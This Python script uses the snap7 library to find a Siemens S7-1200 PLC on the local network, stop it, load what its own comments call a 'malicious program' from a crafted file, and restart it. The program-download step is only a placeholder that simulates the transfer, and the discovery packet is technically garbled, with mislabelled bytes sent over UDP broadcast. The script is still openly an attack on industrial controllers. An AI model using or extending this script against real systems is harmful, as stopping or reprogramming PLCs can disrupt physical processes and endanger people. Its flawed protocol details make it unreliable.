import snap7
import struct
import socket
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Constants
PLC_IP = None  # Initially unknown, will be discovered
PLC_RACK = 0
PLC_SLOT = 1  #  Typical slot for S7-1200
S7_PORT = 102   # Default S7 port

# Define a custom exception for PLC interaction errors
class PLCError(Exception):
    """Custom exception for handling PLC-related errors."""
    pass

def find_plc_ip():
    """
    Finds the IP address of an S7-1200 PLC on the local network.

    This function attempts to discover the PLC's IP address by sending a broadcast
    S7 connection request and listening for a response.
    """
    global PLC_IP
    
    # S7 Connection Request PDU (Protocol Data Unit)
    # Used to establish a connection with a PLC. This is a simplified version.
    connection_request = bytes([
        0x32,  # ISO Transport Protocol (TPKT) Header - Version and Reserved
        0x01,  # TPKT Header - Reserved
        0x00,  # TPKT Header - Length (High Byte) - will be set dynamically
        0x16,  # TPKT Header - Length (Low Byte) - minimum length
        0x11,  # Connection Request TPDU - Credit Negotiation
        0xE0,  # Connection Request TPDU - Destination Reference (High Byte)
        0x00,  # Connection Request TPDU - Destination Reference (Low Byte)
        0x00,  # Connection Request TPDU - Source Reference (High Byte)
        0x01,  # Connection Request TPDU - Source Reference (Low Byte)
        0x00,  # Connection Request TPDU - Class and Options
        0xC0,  # S7 Protocol - PDU Type (Connection Request)
        0x01,  # S7 Protocol - PDU Parameter - Max PDU Length
        0x0A,  # S7 Protocol - PDU Parameter - Max PDU Length (Value)
        0xC1,  # S7 Protocol - PDU Parameter - Max Connections
        0x02,  # S7 Protocol - PDU Parameter - Max Connections (Value)
        0xC2,  # S7 Protocol - PDU Parameter - Protocol ID
        0x02,  # S7 Protocol - PDU Parameter - Protocol ID (Value)
        0x03,  # S7 Protocol - PDU Parameter - ISO-on-TCP Options
        0x00,  # S7 Protocol - PDU Parameter - ISO-on-TCP Options (Reserved)
    ])
    
    # Calculate the TPKT length dynamically
    length = len(connection_request)
    connection_request = connection_request[:2] + struct.pack('!H', length) + connection_request[4:]
    
    broadcast_address = '<broadcast>'  # Sends to the broadcast address on the local network
    #Create UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(5)  # Timeout after 5 seconds

    try:
        # Send the connection request to the broadcast address on port 102
        sock.sendto(connection_request, (broadcast_address, S7_PORT))

        # Listen for a response
        logging.info("Sent S7 connection request. Listening for response...")
        data, addr = sock.recvfrom(1024)
        logging.info(f"Received response from {addr}")
        PLC_IP = addr[0]  # Extract IP address from the response
        logging.info(f"PLC IP address discovered: {PLC_IP}")

    except socket.timeout:
        logging.warning("Timeout: No response received from any PLC.")
        raise PLCError("No PLC found on the network.")

    except Exception as e:
        logging.error(f"An error occurred during PLC discovery: {e}")
        raise PLCError(f"Error during PLC discovery: {e}")

    finally:
        sock.close()

    return PLC_IP


def stop_plc(plc_client):
    """Stops the PLC."""
    try:
        # Send stop command
        result = plc_client.plc_stop()
        if result == 0:
            logging.info("PLC successfully stopped.")
        else:
            logging.error(f"Failed to stop PLC.  Error code: {result}")
            raise PLCError(f"Failed to stop PLC. Error code: {result}")
    except Exception as e:
        logging.error(f"Error while stopping PLC: {e}")
        raise PLCError(f"Error stopping PLC: {e}")


def download_program(plc_client, program_file_path):
    """Downloads a program to the PLC.
       This is a placeholder. Actual program download requires detailed knowledge
       of the S7 protocol and the PLC's internal memory structure.  This function
       simulates the download by printing that a download would happen.

       Args:
           plc_client: The Snap7 client object.
           program_file_path: Path to the program file (e.g., .awl, .s7p - format depends on tool).  In practice,
                              you can't just send an arbitrary file. This file has to be a correctly formatted PLC program.
    """
    try:
        # **THIS IS WHERE THE COMPLEX S7 PROGRAM DOWNLOAD LOGIC GOES**
        #  This involves segmenting the program, sending multiple packets,
        #  handling acknowledgements, and potentially using S7CommPlus for
        #  more efficient and secure transfer.
        #  Due to the complexity and vendor-specific nature, this is a placeholder.

        #For now, we just simulate a download.  This is for demonstration ONLY.
        logging.info(f"Simulating download of program from {program_file_path} to PLC.")
        #  Real implementation would replace the above line with:
        #  1. Read the program file into a buffer.
        #  2. Segment the buffer into smaller chunks.
        #  3. Send each chunk to the PLC using S7Comm or S7CommPlus.
        #  4. Handle acknowledgements and retransmissions.
        #  5. Verify the integrity of the downloaded program.

        # Example of how to read the content, for illustrative purposes
        try:
            with open(program_file_path, 'r') as f:
                program_content = f.read()
            logging.debug(f"Program file content: {program_content[:100]}...") #Print the first 100 chars.
        except FileNotFoundError:
            logging.error(f"Program file not found: {program_file_path}")
            raise PLCError(f"Program file not found: {program_file_path}")
        except Exception as e:
            logging.error(f"Error reading program file: {e}")
            raise PLCError(f"Error reading program file: {e}")
        logging.info("Program Download complete (simulated).") # Replace simulation

    except Exception as e:
        logging.error(f"Error during program download: {e}")
        raise PLCError(f"Error during program download: {e}")

def start_plc(plc_client):
    """Starts the PLC."""
    try:
        # Send start command
        result = plc_client.plc_start()
        if result == 0:
            logging.info("PLC successfully started.")
        else:
            logging.error(f"Failed to start PLC.  Error code: {result}")
            raise PLCError(f"Failed to start PLC. Error code: {result}")
    except Exception as e:
        logging.error(f"Error while starting PLC: {e}")
        raise PLCError(f"Error starting PLC: {e}")



def main():
    global PLC_IP

    try:
        # 1. Discover PLC IP address
        PLC_IP = find_plc_ip()

        # 2. Initialize Snap7 client
        plc = snap7.client.Client()

        # 3. Connect to the PLC
        try:
            plc.connect(PLC_IP, PLC_RACK, PLC_SLOT)
            logging.info(f"Connected to PLC at {PLC_IP}")
        except Exception as e:
            logging.error(f"Failed to connect to PLC: {e}")
            raise PLCError(f"Failed to connect to PLC: {e}")

        # 4. Stop the PLC (if necessary - best practice for full download)
        try:
            stop_plc(plc)
        except PLCError as e:
             logging.error(f"Error stopping PLC: {e}")
             print("Stopping PLC failed.  Attempting download anyway (may fail)...")


        # 5. Download the malicious program
        # Replace "malicious_program.awl" with the actual path to your crafted program file
        try:
            download_program(plc, "malicious_program.awl")
        except PLCError as e:
            logging.error(f"Program download failed: {e}")
            print("Program download failed.  Check error log.")

        # 6. Start the PLC
        try:
            start_plc(plc)
        except PLCError as e:
            logging.error(f"Error starting PLC: {e}")
            print("Starting PLC failed. Check error log.")

    except PLCError as e:
        logging.error(f"A PLC error occurred: {e}")
        print(f"A critical error occurred: {e}. Check the logs for details.")


    finally:
        # 7. Disconnect (ensure proper cleanup)
        if 'plc' in locals() and plc.get_connected():  #Check if PLC is defined and connected
            try:
                plc.disconnect()
                logging.info("Disconnected from PLC.")
            except Exception as e:
                logging.error(f"Error during disconnection: {e}")




if __name__ == "__main__":
    main()